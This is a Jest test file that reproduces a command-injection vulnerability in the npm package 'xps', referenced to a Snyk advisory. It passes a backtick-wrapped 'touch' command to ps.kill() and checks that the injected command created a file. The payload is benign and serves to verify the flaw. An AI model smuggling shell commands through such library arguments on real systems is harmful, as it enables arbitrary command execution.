//https://snyk.io/vuln/SNYK-JS-XPS-590098
test("Command Injection in xps", () => {
  const ps = require("xps");
  const fs = require("fs");
  const path = "./xps";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  ps.kill("`touch xps;`").fork();

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
